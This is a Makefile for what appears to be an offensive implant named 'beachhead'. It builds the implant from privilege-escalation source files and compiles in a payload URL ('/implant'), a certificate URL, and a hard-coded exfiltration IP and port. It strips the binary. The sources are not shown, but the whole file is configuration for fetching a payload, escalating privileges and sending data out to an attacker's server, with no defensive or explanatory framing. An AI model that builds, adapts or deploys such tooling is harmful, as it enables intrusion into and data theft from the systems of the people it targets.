URL ?= http://10.37.1.149/implant
CERT_URL = http://10.37.1.149/cert.pem

CXX = g++
CXXFLAGS = -O2 -s \
           -DURL='"$(URL)"' \
           -DCERT_URL='"$(CERT_URL)"' \
           -DEXFIL_IP='"10.37.1.149"' \
           -DEXFIL_PORT=8889
LDFLAGS = -lssl -lcrypto

TARGET = beachhead
SRC = beachhead.cpp privesc_check.cpp privesc.cpp privesc_check.h privesc.h

all: $(TARGET)

$(TARGET): $(SRC)
	$(CXX) $(CXXFLAGS) -o $(TARGET) $(SRC) $(LDFLAGS)

clean:
	rm -f $(TARGET)
